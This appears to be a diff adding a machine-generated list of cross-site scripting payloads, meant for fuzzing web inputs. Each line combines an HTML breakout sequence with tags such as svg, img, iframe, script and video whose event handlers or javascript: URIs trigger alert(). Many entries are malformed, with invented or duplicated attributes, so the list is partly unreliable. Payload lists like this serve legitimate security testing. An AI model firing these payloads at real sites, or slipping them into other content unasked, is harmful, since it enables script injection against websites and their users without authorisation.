+"><video On Onclick='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+%3e%3c<body Autoplay='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-xss='test'/>
+./>%20<./<video Autofocus Ontoggle='alert(2)' Src='alert(1)' Data-info='test'></video>
+<"<audio On Onsubmit='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+><<input Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+'>\"<img Href='javascript:alert(3)' Onload='alert(3)' Alt='alert(1)' Data-custom='test'/>
+>"<<form Autoplay='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+>"<<img Only='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-test='test'/>
+\"><video Href Onchange='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+<"<svg Onchange='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+./>%20<./<video Popover Onfocus='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+Pjw=<script Onsubmit='alert(1)' Src='alert(1)' Only>alert(1)</script>
+%3e%3c<video Autofocus Onpaste='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+<"<img Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+.\>"</.<form Href='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+'>\"<video Popover Onerror='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+<"<svg Onfocus='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+./>%20<./<iframe Onerror='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+"><input Autoplay='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+Pjw=<audio Autoplay Onkeydown='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+><<img Only='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-info='test'/>
+\"><svg Onpaste='alert(1)' Onload='alert(1)' Href>alert(1)</svg>
+><<audio Autoplay Onpaste='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+.\>"</.<svg Onselect='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+'>\"<svg Onfocus='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+./>%20<./<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-custom='test'/>
+%20/%20><video Only Onsubmit='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+.\>"</.<img Href='javascript:alert(3)' Onkeyup='alert(3)' Alt='alert(1)' Data-xss='test'/>
+>"<<audio Href Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+\"><video Only Onfocus='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+<"<script Onsubmit='alert(1)' Type='alert(1)' Only>alert(1)</script>
+%3e%3c<iframe Onsubmit='alert(1)' Src='alert(1)' Popover>alert(1)</iframe>
+%20/%20><svg Onkeydown='alert(1)' Onload='alert(1)' Only>alert(1)</svg>
+"><audio Popover Ontoggle='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+%20/%20><video On Onblur='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+'>\"<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-info='test'/>
+"><script Onload='alert(1)' Type='alert(1)' On>alert(1)</script>
+./>%20<./<body Href='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20/%20><iframe Onmouseover='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+'>\"<input Popover='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+'>\"<svg Onload='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+\"><body Autoplay='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20">%20<<audio Href Onselect='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+Pjw=<input Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+>"<<iframe Onload='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+%3e%3c<audio Popover Onpaste='alert(2)' Src='alert(1)' Data-test='test'></audio>
+/>%20<<body On='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+%20">%20<<audio Only Onerror='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+Pjw=<body On='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+/>%20<<img Popover='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+%20">%20<<img Only='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='test'/>
+"><audio Autofocus Onblur='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+%3e%3c<iframe Onsubmit='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+./>%20<./<script Onerror='alert(1)' Src='alert(1)' On>alert(1)</script>
+Pjw=<input Autoplay='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+'>\"<audio Href Onkeyup='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+%20/%20><video Autoplay Onmouseover='alert(2)' Src='alert(1)' Data-xss='test'></video>
+>"<<iframe Onkeydown='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+/>%20<<audio Href Onchange='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+Pjw=<video Only Onchange='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+\"><script Onsubmit='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+"><svg Ontoggle='alert(1)' Style='alert(1)' Only>alert(1)</svg>
+%3e%3c<svg Onblur='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+'>\"<iframe Onmouseover='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%20/%20><svg Onpaste='alert(1)' Onmouseover='alert(1)' Only>alert(1)</svg>
+'>\"<body Only='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20">%20<<svg Onblur='alert(1)' Style='alert(1)' Href>alert(1)</svg>
+<"<svg Onkeydown='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+<"<body Popover='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-xss='test'/>
+"><script Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
